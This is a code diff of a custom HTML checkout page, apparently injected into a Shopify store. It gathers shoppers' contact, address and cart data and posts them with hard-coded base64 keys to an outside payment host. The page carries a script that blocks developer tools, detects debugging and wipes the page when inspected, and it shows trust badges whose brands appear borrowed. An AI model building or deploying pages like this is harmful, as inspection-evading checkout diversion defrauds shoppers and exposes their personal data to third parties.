@@ -4,23 +4,19 @@
 <head>
   <!-- 
     ============================================================================
-    SECURITY LAYER: ANTI-DEVTOOLS & CONTEXT MENU PROTECTION
+    SECURITY LAYER: PROTECTING INTELLECTUAL PROPERTY & DATA
     ============================================================================
   -->
   <script type="text/javascript">
     /**
-     * 安全防护脚本：禁止右键、禁止快捷键打开开发者工具。
-     * 当检测到调试环境时，自动清空页面并重定向。
+     * 安全防护层：禁止调试、右键及非法截取
      */
     (function () {
-      // 1. 禁止右键菜单 (防止用户通过右键点击“检查”)
-      document.addEventListener('contextmenu', function (e) {
-        e.preventDefault();
-      });
+      // 禁用右键菜单，防止查看元素
+      document.addEventListener('contextmenu', e => e.preventDefault());
 
-      // 2. 禁止常用的开发者工具快捷键
+      // 禁用 F12, Ctrl+Shift+I, Ctrl+U 等开发者常用快捷键
       document.onkeydown = function (e) {
-        // F12 (123), Ctrl+Shift+I (73), Ctrl+Shift+J (74), Ctrl+U (85), Ctrl+S (83)
         if (e.keyCode === 123 || 
           (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
           (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) || 
@@ -30,7 +26,7 @@
       };
 
       /**
-       * 销毁页面函数：清空内容并跳转空白页
+       * 页面自毁逻辑：防止在非受控环境下运行或调试
        */
       function killPage() {
         document.body.innerHTML = "";
@@ -38,7 +34,7 @@
       }
 
       /**
-       * 调试检测逻辑：根据窗口内外宽度差以及 debugger 响应时间判断
+       * 开发者工具检测逻辑
        */
       function detectDevTools() {
         const isRealMobile = /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
@@ -51,8 +47,6 @@
             return true; 
           }
         }
-        
-        // 基于时间差的 debugger 检测
         const start = performance.now();
         debugger;
         const end = performance.now();
@@ -63,7 +57,6 @@
         return false;
       }
       
-      // 定时轮询检测
       setInterval(detectDevTools, 1000);
       window.addEventListener('resize', detectDevTools);
       window.addEventListener('load', detectDevTools);
@@ -76,11 +69,11 @@
 
   <!-- 
     ============================================================================
-    CSS STYLING: BEAUTIFIED & EXPANDED
+    CSS DESIGN SYSTEM: MODERN & CLEAN LAYOUT
     ============================================================================
   -->
   <style>
-    /* === 基础全局重置 === */
+    /* === Global Reset === */
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background-color: #fff;
@@ -88,14 +81,12 @@
       margin: 0;
       padding: 0;
       -webkit-font-smoothing: antialiased;
-      line-height: 1.5;
     }
 
     * {
       box-sizing: border-box;
     }
 
-    /* === 响应式主容器 === */
     .main-container {
       display: flex;
       flex-wrap: wrap;
@@ -104,7 +95,7 @@
       min-height: 100vh;
     }
 
-    /* === 左侧：表单输入区域 === */
+    /* === Left Column: Checkout Forms === */
     .form-section {
       flex: 1.2;
       padding: 40px;
@@ -119,7 +110,6 @@
       margin: 35px 0 15px 0;
       padding-bottom: 10px;
       color: #333;
-      text-transform: none;
     }
 
     .section-title:first-child {
@@ -135,7 +125,6 @@
     .input-box {
       flex: 1;
       margin-bottom: 12px;
-      position: relative;
     }
 
     label.field-label {
@@ -156,20 +145,16 @@
       transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
       background: #fff;
       color: #333;
-      outline: none;
     }
 
     input:focus,
     select:focus {
       border-color: #2b5ef8;
+      outline: none;
       box-shadow: 0 0 0 1px #2b5ef8;
     }
 
-    input::placeholder {
-      color: #999;
-    }
-
-    /* === 支付方式列表样式 === */
+    /* === Payment Selection Grid === */
     .payment-list {
       display: flex;
       flex-direction: column;
@@ -191,7 +176,7 @@
     }
 
     .payment-option:hover {
-      background: #ededed;
+      background: #e9e9e9;
     }
 
     .payment-option.selected {
@@ -225,7 +210,7 @@
       image-rendering: -webkit-optimize-contrast;
     }
 
-    /* === 运费选择区域 === */
+    /* === Shipping Method Styles === */
     .shipping-method-item {
       display: flex;
       align-items: center;
@@ -234,13 +219,11 @@
       border-radius: 5px;
       margin-bottom: 10px;
       cursor: pointer;
-      transition: background 0.2s;
     }
 
     .shipping-method-item.selected {
       border-color: #2b5ef8;
       background-color: #f9fdfa;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.02);
     }
 
     .shipping-method-item input {
@@ -249,7 +232,7 @@
       accent-color: #2b5ef8;
     }
 
-    /* === 右侧：订单摘要区域 === */
+    /* === Right Column: Order Summary === */
     .summary-section {
       flex: 0.8;
       background: #fafafa;
@@ -258,7 +241,6 @@
       padding: 40px;
     }
 
-    /* 移动端摘要切换器 */
     .mobile-summary-toggle {
       display: none;
       background: #fafafa;
@@ -305,7 +287,6 @@
       display: block;
     }
 
-    /* 商品列表渲染 */
     .product-list {
       margin-bottom: 20px;
       margin-top: 10px;
@@ -379,7 +360,6 @@
       text-align: right;
     }
 
-    /* 金额行基础样式 */
     .summary-line {
       display: flex;
       justify-content: space-between;
@@ -388,7 +368,6 @@
       color: #555;
     }
 
-    /* 底部总计行 */
     .total-line {
       margin-top: 20px;
       padding-top: 20px;
@@ -401,7 +380,6 @@
     .total-label {
       font-size: 16px;
       font-weight: 500;
-      color: #333;
     }
 
     .total-price {
@@ -419,7 +397,7 @@
       vertical-align: middle;
     }
 
-    /* 提交按钮样式 */
+    /* === Action Buttons === */
     button#submit-btn {
       width: 100%;
       padding: 18px;
@@ -443,7 +421,31 @@
       cursor: not-allowed;
     }
 
-    /* === 优惠券输入与展示美化 === */
+    /* === Language Switcher Section === */
+    .lang-switcher-wrapper {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      margin-bottom: 15px;
+    }
+
+    .lang-switcher-wrapper select {
+      width: auto;
+      padding: 6px 10px;
+      font-size: 13px;
+      border: 1px solid #d9d9d9;
+      border-radius: 4px;
+      cursor: pointer;
+      background: #fff;
+    }
+
+    .pc-lang-switcher {
+      margin-top: 25px;
+      border-top: 1px solid #e1e1e1;
+      padding-top: 15px;
+    }
+
+    /* === Discount Module Styles === */
     .discount-input-wrapper {
       display: flex;
       gap: 10px;
@@ -470,9 +472,8 @@
       background: #e5e5e5;
     }
 
-    /* 折扣行样式：显示优惠码标题 */
     .discount-line-item {
-      display: none; /* 默认隐藏，JS 激活 */
+      display: none; /* Controlled by JS */
       justify-content: space-between;
       margin-top: 12px;
       font-size: 14px;
@@ -492,7 +493,6 @@
       align-items: center;
     }
 
-    /* 产品划线价格与折扣标签 */
     .price-original {
       text-decoration: line-through;
       color: #717171;
@@ -510,14 +510,13 @@
       text-transform: uppercase;
     }
 
-    /* TOTAL SAVINGS 模块 */
     .savings-summary-box {
       margin-top: 15px;
       padding: 12px;
       background: #f4f4f4;
       border: 1px solid #e1e1e1;
       border-radius: 4px;
-      display: none; /* 默认隐藏 */
+      display: none; /* Controlled by JS */
       align-items: center;
       font-weight: 600;
       font-size: 15px;
@@ -531,31 +530,7 @@
       fill: #333;
     }
 
-    /* === 翻译选择器样式 === */
-    .lang-switcher-wrapper {
-      display: flex;
-      align-items: center;
-      justify-content: flex-end;
-      margin-bottom: 15px;
-    }
-
-    .lang-switcher-wrapper select {
-      width: auto;
-      padding: 6px 10px;
-      font-size: 13px;
-      border: 1px solid #d9d9d9;
-      border-radius: 4px;
-      cursor: pointer;
-      background: #fff;
-    }
-
-    .pc-lang-switcher {
-      margin-top: 25px;
-      border-top: 1px solid #e1e1e1;
-      padding-top: 15px;
-    }
-
-    /* === 遮罩层加载动画 === */
+    /* === Loader Mask === */
     #wcr-a-payment-loader {
       position: fixed;
       top: 0;
@@ -598,15 +573,7 @@
       100% { transform: rotate(360deg); }
     }
 
-    .wcr-a-text {
-      font-family: inherit;
-      font-size: 16px;
-      color: #333;
-      font-weight: 500;
-      line-height: 1.5;
-    }
-
-    /* === 移动端适配适配 === */
+    /* === Mobile Adaptability === */
     @media (max-width: 900px) {
       .main-container {
         flex-direction: column-reverse;
@@ -671,7 +638,6 @@
   <div class="main-container">
     <!-- LEFT: CHECKOUT FORM SECTION -->
     <div class="form-section">
-      <!-- MOBILE LANGUAGE SELECTOR -->
       <div class="lang-switcher-wrapper mobile-lang-switcher">
         <select class="lang-selector">
           <option value="en">English</option>
@@ -682,7 +648,6 @@
       </div>
 
       <form id="payment-form">
-        <!-- CONTACT INFO -->
         <div class="section-title" data-i18n="title_contact">Contact</div>
         <div class="input-box">
           <label class="field-label" data-i18n="label_email">Email Address</label>
@@ -693,7 +658,6 @@
           <input type="tel" id="phone" required placeholder="Phone number">
         </div>
 
-        <!-- SHIPPING INFO -->
         <div class="section-title" data-i18n="title_shipping">Shipping Address</div>
         <div class="input-box">
           <label class="field-label" data-i18n="label_country">Country/Region</label>
@@ -733,13 +697,11 @@
           </div>
         </div>
 
-        <!-- SHIPPING METHODS -->
         <div id="shipping-method-area" style="display:none;">
           <div class="section-title" data-i18n="title_shipping_method">Shipping Method</div>
           <div id="shipping-rates-list"></div>
         </div>
 
-        <!-- PAYMENT METHODS -->
         <div class="section-title" data-i18n="title_payment">Payment Method</div>
         <div id="payment-container" class="payment-list">
           <div style="padding:15px; color:#666; font-size:14px;">Loading payment options...</div>
@@ -748,21 +710,15 @@
 
         <button type="submit" id="submit-btn" data-i18n="btn_place_order">PLACE ORDER</button>
 
-        <!-- TRUST BADGES -->
         <div class="trust-badges">
           <img src="https://image.defitopay.com/worldgate.svg" alt="Secured by WorldGate">
           <img src="https://image.defitopay.com/pci.svg" alt="PCI DSS Compliant">
-        </div>
-
-        <div style="margin-top:20px; text-align: center; font-weight: bold; font-size: 11px; color:#bbb;">
-          Copyright 2026 Worldpay LLC, and its affiliates.
         </div>
       </form>
     </div>
 
     <!-- RIGHT: ORDER SUMMARY SECTION -->
     <div class="summary-section">
-      <!-- MOBILE TOGGLE BAR -->
       <div class="mobile-summary-toggle" id="summaryToggle">
         <div class="toggle-left">
           <svg viewBox="0 0 20 20">
@@ -776,23 +732,19 @@
         <div class="toggle-total" id="mobile-total-display">$0.00</div>
       </div>
 
-      <!-- MAIN SUMMARY CONTENT -->
       <div class="summary-content" id="summaryContent">
         <div id="product-list" class="product-list"></div>
 
-        <!-- DISCOUNT INPUT BOX -->
         <div class="discount-input-wrapper">
           <input type="text" id="coupon-input" placeholder="Discount code or gift card">
           <button type="button" class="btn-apply" id="apply-coupon-btn" onclick="applyDiscount()">Apply</button>
         </div>
 
-        <!-- FEES SUMMARY -->
         <div class="summary-line">
           <span data-i18n="summary_subtotal">Subtotal</span>
           <span id="subtotal-val">0.00</span>
         </div>
         
-        <!-- DYNAMIC DISCOUNT ROW -->
         <div class="discount-line-item" id="discount-row">
           <div class="discount-detail-label">
             <span>Order discount</span>
@@ -806,7 +758,6 @@
           <span id="shipping-display" data-i18n="summary_calc">Calculated at next step</span>
         </div>
         
-        <!-- FINAL TOTAL -->
         <div class="total-line">
           <span class="total-label" data-i18n="summary_total">Total</span>
           <div style="display:flex; align-items:baseline;">
@@ -815,13 +766,11 @@
           </div>
         </div>
 
-        <!-- TOTAL SAVINGS MODULE -->
         <div class="savings-summary-box" id="savings-summary-box">
           <svg viewBox="0 0 16 16"><path d="M16 8c0 .28-.22.5-.5.5h-2.1c-.28 0-.5-.22-.5-.5s.22-.5.5-.5h2.1c.28 0 .5.22.5.5zm-5.41-3.41L12 3.17c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0L9.88 3.88c-.2.2-.2.51 0 .71.2.2.51.2.71 0zM4 12h8v2H4v-2zm0-3h8v2H4V9zm0-3h8v2H4V6zm10.71-3.71c-.2-.2-.51-.2-.71 0L12.59 3.7c-.2.2-.2.51 0 .71.2.2.51.2.71 0l1.41-1.41c.2-.2.2-.51 0-.71zM15 8c0-3.87-3.13-7-7-7S1 4.13 1 8s3.13 7 7 7 7-3.13 7-7zM8 2c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6z"/></svg>
           <span>TOTAL SAVINGS <span id="total-savings-val">0.00</span></span>
         </div>
 
-        <!-- PC LANGUAGE SWITCHER -->
         <div class="lang-switcher-wrapper pc-lang-switcher">
           <select class="lang-selector">
             <option value="en">English</option>
@@ -834,7 +783,6 @@
     </div>
   </div>
 
-  <!-- LOADER MASK -->
   <div id="wcr-a-payment-loader">
     <div class="wcr-a-loader-content">
       <div class="wcr-a-spinner"></div>
@@ -847,43 +795,14 @@
     </div>
   </div>
 
-  <!-- 
-    ============================================================================
-    JAVASCRIPT: CORE LOGIC & API INTERACTION
-    ============================================================================
-  -->
   <script>
     /**
-     * GLOBAL STATE & CONFIG
+     * CORE STATE MANAGEMENT
      */
     let currentCart = null;
     let selectedShippingRate = null;
     let availableShippingRates = [];
     let currentAppliedDiscounts = [];
-
-    const shopifyOption = { id: 'shopify_checkout', name: 'Shopify Secure Checkout', icon: 'https://image.defitopay.com/global_pay.svg' };
-    
-    const currencyPaymentMap = {
-      'USD': [shopifyOption],
-      'JPY': [{ id: 'paypay', name: 'PayPay', icon: 'https://image.defitopay.com/paypay.svg' }, 
-              { id: 'aupay', name: 'au Pay', icon: 'https://image.defitopay.com/aupay.svg' }, shopifyOption],
-      'KRW': [{ id: 'kakaopay', name: 'KakaoPay', icon: 'https://image.defitopay.com/kakaopay.png' }, 
-              { id: 'tosspay', name: 'Toss Pay', icon: 'https://image.defitopay.com/tosspay.png' }, 
-              { id: 'naverpay', name: 'Naver Pay', icon: 'https://image.defitopay.com/naverpay.png' }, shopifyOption],
-      'TWD': [{ id: 'jkopay', name: 'JKOPay', icon: 'https://image.defitopay.com/tw_jkopay.png' }, shopifyOption],
-      'DEFAULT': [shopifyOption]
-    };
-
-    const allCountries = [
-      { code: "US", name: "United States" }, 
-      { code: "JP", name: "日本国" }, 
-      { code: "KR", name: "대한민국" }, 
-      { code: "TW", name: "Taiwan" }, 
-      { code: "HK", name: "Hong Kong" }, 
-      { code: "GB", name: "United Kingdom" }, 
-      { code: "CA", name: "Canada" }, 
-      { code: "AU", name: "Australia" }
-    ];
 
     /**
      * MULTI-LANGUAGE ENGINE
@@ -896,13 +815,11 @@
         if (!res.ok) return;
         const trans = await res.json();
 
-        // Translate text content
         document.querySelectorAll('[data-i18n]').forEach(el => {
           const key = el.getAttribute('data-i18n');
           if (trans[key]) el.textContent = trans[key];
         });
 
-        // Translate placeholders
         const placeholders = { 'email': 'placeholder_email', 'address': 'placeholder_address', 'phone': 'placeholder_phone' };
         for (let id in placeholders) {
           const el = document.getElementById(id);
@@ -915,15 +832,14 @@
     }
 
     /**
-     * UI DATA BINDING & UPDATES
+     * DATA SYNC & DISPLAY ENGINE
      */
     async function loadCartData() {
       try {
-        // Fetch real-time data from Shopify Cart API
         const res = await fetch('/cart.js');
         currentCart = await res.json();
         
-        // Extract cart-level discounts (Manual or Automatic)
+        // Extract Cart-Level Discounts (like Manual Coupons)
         currentAppliedDiscounts = currentCart.cart_level_discount_applications || [];
         
         document.getElementById('currency-tag').innerText = currentCart.currency;
@@ -936,23 +852,30 @@
       if (!currentCart) return;
       
       const currency = currentCart.currency;
-      let calculatedSavings = 0;
+      let totalSavings = 0;
       let productHtml = '';
+      
+      // Store potential automatic discount title from line levels
+      let automaticDiscountTitle = "";
 
-      // 1. Process items and line-level discounts
       currentCart.items.forEach(item => {
-        const originalLine = item.original_line_price / 100;
-        const finalLine = item.final_line_price / 100;
-        const lineDiscount = originalLine - finalLine;
-        calculatedSavings += lineDiscount;
+        // Line-level original vs final
+        const originalLinePrice = item.original_line_price / 100;
+        const finalLinePrice = item.final_line_price / 100;
+        const lineDiscount = originalLinePrice - finalLinePrice;
+        totalSavings += lineDiscount;
 
         let badges = '';
-        if (item.line_level_discount_allocations) {
-          item.line_level_discount_allocations.forEach(d => {
+        if (item.line_level_discount_allocations && item.line_level_discount_allocations.length > 0) {
+          item.line_level_discount_allocations.forEach(allocation => {
             badges += `
               <div class="product-discount-badge">
-                [${d.discount_application.title}] -${(d.amount/100).toFixed(2)} ${currency}
+                [${allocation.discount_application.title}] -${(allocation.amount/100).toFixed(2)} ${currency}
               </div>`;
+            // Capture the first automatic discount title we find
+            if (!automaticDiscountTitle) {
+              automaticDiscountTitle = allocation.discount_application.title;
+            }
           });
         }
 
@@ -968,21 +891,19 @@
               ${badges}
             </div>
             <div class="product-price">
-              ${lineDiscount > 0 ? `<span class="price-original">${originalLine.toFixed(2)}</span>` : ''}
-              <span class="price-current">${finalLinePriceText(finalLine)} ${currency}</span>
+              ${lineDiscount > 0 ? `<span class="price-original">${originalLinePrice.toFixed(2)}</span>` : ''}
+              <span class="price-current">${finalLinePrice.toFixed(2)} ${currency}</span>
             </div>
           </div>`;
       });
       document.getElementById('product-list').innerHTML = productHtml;
 
-      // 2. Calculate totals using Shopify's logic
-      // Total Discount includes both line level and cart level
+      // Calculate absolute totals
       const totalDiscountAmount = (currentCart.total_discount / 100);
       const subtotalPostDiscount = (currentCart.total_price / 100);
-      const shipPrice = selectedShippingRate ? parseFloat(selectedShippingRate.price) : 0;
-      const finalGrandTotal = subtotalPostDiscount + shipPrice;
+      const shippingPrice = selectedShippingRate ? parseFloat(selectedShippingRate.price) : 0;
+      const finalGrandTotal = subtotalPostDiscount + shippingPrice;
 
-      // 3. Render summary lines
       document.getElementById('subtotal-val').innerText = subtotalPostDiscount.toFixed(2) + " " + currency;
       
       const discountRow = document.getElementById('discount-row');
@@ -992,43 +913,40 @@
         discountRow.style.display = 'flex';
         document.getElementById('discount-val').innerText = "- " + totalDiscountAmount.toFixed(2) + " " + currency;
         
-        // Display the first matching discount title
-        let mainTitle = "Bundle Discount";
+        // Priority: Cart-level code title > Line-level automatic title
+        let mainTitle = automaticDiscountTitle;
         if (currentAppliedDiscounts.length > 0) {
-          mainTitle = currentAppliedDiscounts[0].title;
-        } else if (currentCart.items.some(i => i.line_level_discount_allocations.length > 0)) {
-          mainTitle = currentCart.items.find(i => i.line_level_discount_allocations.length > 0).line_level_discount_allocations[0].discount_application.title;
+           mainTitle = currentAppliedDiscounts[0].title;
         }
-        document.getElementById('discount-detail-text').innerText = mainTitle;
+        
+        document.getElementById('discount-detail-text').innerText = mainTitle || "Automatic Discount";
         
         savingsBox.style.display = 'flex';
         document.getElementById('total-savings-val').innerText = totalDiscountAmount.toFixed(2) + " " + currency;
+        
+        // Set global variables for final submission
+        window.finalDiscountCode = mainTitle || "Automatic Discount";
+        window.finalDiscountVal = totalDiscountAmount.toFixed(2);
       } else {
         discountRow.style.display = 'none';
         savingsBox.style.display = 'none';
+        window.finalDiscountCode = "";
+        window.finalDiscountVal = 0;
       }
 
-      // Shipping label update
       if (selectedShippingRate) {
-        document.getElementById('shipping-display').innerText = shipPrice.toFixed(2) + " " + currency;
+        document.getElementById('shipping-display').innerText = shippingPrice.toFixed(2) + " " + currency;
       } else {
         document.getElementById('shipping-display').innerText = "Calculated at next step";
       }
 
-      // FINAL FIGURES
       document.getElementById('total-val').innerText = finalGrandTotal.toFixed(2);
       document.getElementById('mobile-total-display').innerText = finalGrandTotal.toFixed(2) + " " + currency;
-      
-      // Store globally for payment payload
       window.finalPayAmount = finalGrandTotal.toFixed(2);
-      window.finalDiscountCode = currentAppliedDiscounts.length > 0 ? currentAppliedDiscounts[0].title : "";
-      window.finalDiscountVal = totalDiscountAmount.toFixed(2);
     }
 
-    function finalLinePriceText(val) { return val.toFixed(2); }
-
     /**
-     * DISCOUNT CODE APPLICATION
+     * MANUAL DISCOUNT APPLICATION
      */
     window.applyDiscount = async function() {
       const codeInput = document.getElementById('coupon-input');
@@ -1040,13 +958,11 @@
       btn.disabled = true;
 
       try {
-        // Shopify Discount Endpoint
         await fetch(`/discount/${encodeURIComponent(code)}`);
-        // Refresh cart data to see what Shopify applied
         await loadCartData();
         codeInput.value = "";
       } catch (e) {
-        alert("Coupon application failed. Please try again.");
+        alert("Coupon application failed.");
       } finally {
         btn.innerText = "Apply";
         btn.disabled = false;
@@ -1054,7 +970,7 @@
     };
 
     /**
-     * SHIPPING CALCULATION
+     * SHIPPING RATE CALCULATION
      */
     async function fetchShippingRates() {
       const country = document.getElementById('country').value;
@@ -1088,7 +1004,7 @@
           listDiv.innerHTML = html;
           updateTotalDisplay();
         } else {
-          listDiv.innerHTML = "<div style='padding:10px; color:red;'>No shipping methods available for this location.</div>";
+          listDiv.innerHTML = "<div style='padding:10px; color:red;'>No shipping rates available.</div>";
         }
       } catch (err) {
         listDiv.innerHTML = "Error loading shipping rates.";
@@ -1106,13 +1022,19 @@
     };
 
     /**
-     * PAYMENT GATEWAY ROUTING
+     * GATEWAY LOGIC
      */
+    const shopifyOption = { id: 'shopify_checkout', name: 'Shopify Secure Checkout', icon: 'https://image.defitopay.com/global_pay.svg' };
+    const currencyPaymentMap = {
+      'USD': [shopifyOption],
+      'JPY': [{ id: 'paypay', name: 'PayPay', icon: 'https://image.defitopay.com/paypay.svg' }, shopifyOption],
+      'DEFAULT': [shopifyOption]
+    };
+
     function renderPaymentMethods(currency) {
       const container = document.getElementById('payment-container');
       const methods = currencyPaymentMap[currency] || currencyPaymentMap['DEFAULT'];
       let html = '';
-      
       methods.forEach((m, index) => {
         const isChecked = index === 0;
         if (isChecked) document.getElementById('gateway').value = m.id;
@@ -1134,38 +1056,23 @@
     };
 
     /**
-     * FORM SUBMISSION & PAYLOAD DELIVERY
+     * SUBMISSION & PAYLOAD DELIVERY
      */
     document.getElementById('payment-form').onsubmit = async function(e) {
       e.preventDefault();
-      
       const gateway = document.getElementById('gateway').value;
-      const btn = document.getElementById('submit-btn');
       if (!gateway) return;
 
       document.getElementById('wcr-a-payment-loader').style.display = 'flex';
 
-      // Scenario 1: Fallback to Shopify Native Checkout
       if (gateway === 'shopify_checkout') {
         const p = new URLSearchParams();
-        const map = { 
-          'checkout[email]': 'email', 
-          'checkout[shipping_address][first_name]': 'fname', 
-          'checkout[shipping_address][last_name]': 'lname', 
-          'checkout[shipping_address][address1]': 'address', 
-          'checkout[shipping_address][city]': 'city', 
-          'checkout[shipping_address][country]': 'country', 
-          'checkout[shipping_address][province]': 'state', 
-          'checkout[shipping_address][zip]': 'zip', 
-          'checkout[shipping_address][phone]': 'phone' 
-        };
+        const map = { 'checkout[email]': 'email', 'checkout[shipping_address][first_name]': 'fname', 'checkout[shipping_address][last_name]': 'lname', 'checkout[shipping_address][address1]': 'address', 'checkout[shipping_address][city]': 'city', 'checkout[shipping_address][country]': 'country', 'checkout[shipping_address][province]': 'state', 'checkout[shipping_address][zip]': 'zip', 'checkout[shipping_address][phone]': 'phone' };
         for (let k in map) { p.append(k, document.getElementById(map[k]).value); }
         window.top.location.href = '/checkout?' + p.toString();
         return;
       }
 
-      // Scenario 2: Secure Payment Gateway Handshake
-      btn.disabled = true;
       const payload = {
         order_id: "SH-" + Date.now() + Math.floor(Math.random() * 1000).toString(),
         total_amount: window.finalPayAmount,
@@ -1175,19 +1082,19 @@
         return_url: window.location.origin + "/pages/thank-you",
         hook_url: "https://test-pay.defitopay.com/api/v2/an/status-update",
         
-        // Pass the actual discount information to the gateway
+        // SYNC AUTOMATIC OR MANUAL DISCOUNT NAME
         discount_code: window.finalDiscountCode || "",
         discount_amount: window.finalDiscountVal || 0,
         
+        // CRITICAL: Send original_price to line_items so Shopify can apply the discount accurately
         line_items: currentCart.items.map(i => ({
           variant_id: i.variant_id,
           quantity: i.quantity,
           title: i.title,
-          price: (i.price / 100).toFixed(2)
+          price: (i.original_price / 100).toFixed(2) 
         })),
         
         shipping_lines: selectedShippingRate ? [{ title: selectedShippingRate.name, price: selectedShippingRate.price }] : [],
-        
         billing: {
           email: document.getElementById('email').value,
           phone: document.getElementById('phone').value,
@@ -1201,7 +1108,6 @@
         }
       };
 
-      // API Security Keys
       const _p = "TUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGRERGUThBTUlJQkNnS0NBUUVBb0RPWG1wU0FZelNERjNKdSthRUhabVJSdk5XRDZDQ0N3dVVMUW1kR0pnb0pqV1d4Ym1hQQ==";
       const _s = "TUlJRXZRSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2N3Z2dTakFnRUFBb0lCQVFESC96Mkp0amRjNDdMQm11eFJLTmhsbENQQUZscEI0SGhpbkV5MFRnRUtUZUJaKzZxVkJrMmMxaGJqVWFYUXdkZ0R3UTRTMEo=";
 
@@ -1216,37 +1122,33 @@
           },
           body: JSON.stringify(payload)
         });
-
         const result = await response.json();
-        if (result.pay_url) {
-          window.top.location.href = result.pay_url;
-        } else {
-          document.getElementById('wcr-a-payment-loader').style.display = 'none';
-          alert("Error: " + result.message);
-          btn.disabled = false;
-        }
+        if (result.pay_url) window.top.location.href = result.pay_url;
+        else { document.getElementById('wcr-a-payment-loader').style.display = 'none'; alert("Error: " + result.message); }
       } catch (err) {
         document.getElementById('wcr-a-payment-loader').style.display = 'none';
-        alert("Payment system currently unavailable. Please try again later.");
-        btn.disabled = false;
+        alert("System error. Please try again.");
       }
     };
 
     /**
-     * INITIALIZATION & EVENT LISTENERS
+     * BOOTSTRAP
      */
     function initCountries() {
       const select = document.getElementById('country');
       allCountries.forEach(c => {
         const op = document.createElement('option');
-        op.value = c.code;
-        op.innerText = c.name;
+        op.value = c.code; op.innerText = c.name;
         select.appendChild(op);
       });
     }
 
+    const allCountries = [{ code: "US", name: "United States" }, { code: "JP", name: "日本国" }, { code: "TW", name: "Taiwan" }];
+
     document.addEventListener('DOMContentLoaded', () => {
-      // Initialize summary toggle
+      initCountries();
+      loadCartData();
+      
       const toggle = document.getElementById('summaryToggle');
       const content = document.getElementById('summaryContent');
       toggle.onclick = () => {
@@ -1254,23 +1156,16 @@
         toggle.classList.toggle('expanded');
       };
 
-      // Shipping trigger listeners
       ['zip', 'state', 'country'].forEach(id => {
         const el = document.getElementById(id);
         if (el) el.addEventListener('change', fetchShippingRates);
       });
 
-      // Language init
       const savedLang = localStorage.getItem('preferred_lang');
       const browserLang = navigator.language.split('-')[0];
       const targetLang = savedLang || (['ja','ko','zh'].includes(browserLang) ? (browserLang === 'zh' ? 'zh-TW' : browserLang) : 'en');
-      
       applyLanguage(targetLang);
       document.querySelectorAll('.lang-selector').forEach(s => s.onchange = (e) => applyLanguage(e.target.value));
-
-      // Load shopify data
-      initCountries();
-      loadCartData();
     });
   </script>
 </body>
